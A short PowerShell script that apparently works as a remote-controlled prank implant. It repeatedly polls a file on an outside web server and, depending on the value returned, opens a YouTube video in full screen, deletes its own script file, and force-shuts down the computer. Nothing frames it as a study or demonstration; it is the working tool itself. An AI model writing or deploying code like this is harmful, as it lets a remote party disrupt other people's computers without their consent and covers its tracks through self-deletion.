$checkInterval = 15
$youtubeUrl = "https://www.youtube.com/watch?v=OaPNpvYTeI4"
$watchTime = 45
$url = "https://wkrgames.com/guslarz/pr/start.txt"

$scriptPath = $MyInvocation.MyCommand.Path

while ($true) {
    try {
        $content = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 5
        $value = $content.Content.Trim()
    } catch {
        Start-Sleep $checkInterval
        continue
    }

    switch ($value) {
        "1" {
            Start-Process $youtubeUrl -WindowStyle Normal
            Start-Sleep 5

            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.SendKeys]::SendWait("f")

            Start-Sleep $watchTime

            if (Test-Path $scriptPath) {
                Remove-Item $scriptPath -Force
            }

            Stop-Computer -Force
        }

        "2" {
            Start-Process $youtubeUrl -WindowStyle Normal
            Start-Sleep 5

            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.SendKeys]::SendWait("f")
        }

        "3" {
            if (Test-Path $scriptPath) {
                Remove-Item $scriptPath -Force
            }

            Stop-Computer -Force
        }
    }

    Start-Sleep $checkInterval
}
